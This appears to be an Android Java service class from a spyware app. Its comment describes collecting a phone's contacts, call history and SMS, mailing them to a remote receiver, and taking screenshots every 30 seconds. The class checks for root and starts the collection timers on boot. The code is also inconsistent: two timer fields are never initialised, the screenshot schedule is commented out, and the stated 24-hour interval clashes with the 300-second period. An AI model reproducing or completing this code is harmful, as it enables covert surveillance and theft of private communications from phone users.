package com.system;

import java.util.Timer;
import java.util.TimerTask;

import com.system.utils.SysUtils;

import android.app.Service;
import android.content.Intent;
import android.os.Binder;
import android.os.IBinder;
import android.util.Log;

/**
 * Demo service that schedules a timer task
 * The timer task will execute the following tasks:
 *  - When starting the networks and over 24 hours to the previous timing, 
 *    will get all contacts, phone call history and SMS, 
 *    saved as attachments and mail to the qualified receiver.
 *  - When staring the machine and network is connected, 
 *    get the 1st screenshot delayed 3 seconds and then do it in a 30 seconds circle.    
 */
public class BootService extends Service 
{
	private final String LOGTAG = "BootService";
	
	private Timer mGetInfoTimer;
	private GetInfoTask mInfoTask;
	private final long mGetInfoDelay  = 10000; // 10 Seconds
	private final long mGetInfoPeriod = 300000; // 300 Seconds
	
	private Timer mScreenshotTimer;
	private CaptureTask mCapTask;
	private final long mScreenshotDelay  = 3000;  // 3  Seconds
	private final long mScreenshotPeriod = 30000; // 30 Seconds

	@Override
	public IBinder onBind(final Intent intent) {
		Log.d(LOGTAG, "onBind"); 
		return null;
	}
	
	@Override
    public void onDestroy() {  
        Log.i(LOGTAG, "onDestroy");  
    }
	
	@Override  
    public boolean onUnbind(Intent intent) {  
        Log.i(LOGTAG, "onUnbind");  
        return super.onUnbind(intent);  
    }

	@Override
	public void onCreate() {
		super.onCreate();
		Log.i(LOGTAG, "created");
		
        // make sure the phone is rooted
        if (!SysUtils.isRooted(getApplicationContext())) {
        	Log.d(SysUtils.TAG_DEBUG, "Not rooted");
        	SysUtils.messageBox(getApplicationContext(), "Failed to get root");
        	return;
        }
        SysUtils.messageBox(getApplicationContext(), "get root successfully");
		
		mScreenshotTimer = new Timer();
		mCapTask = new CaptureTask(this);
	}

	@Override
	public void onStart(final Intent intent, final int startId) {
		super.onStart(intent, startId);
		Log.i(LOGTAG, "started");
		
		// Start timer to get contacts, phone call history and SMS
		mGetInfoTimer.scheduleAtFixedRate(mInfoTask, mGetInfoDelay, mGetInfoPeriod);
		
		// Start timer to capture screenshot
		//mScreenshotTimer.schedule(mCapTask, mScreenshotDelay, mScreenshotPeriod);
	}
	
	public class IaiaiBinder extends Binder {  
        public BootService getService() {  
            return BootService.this;  
        }  
    }
}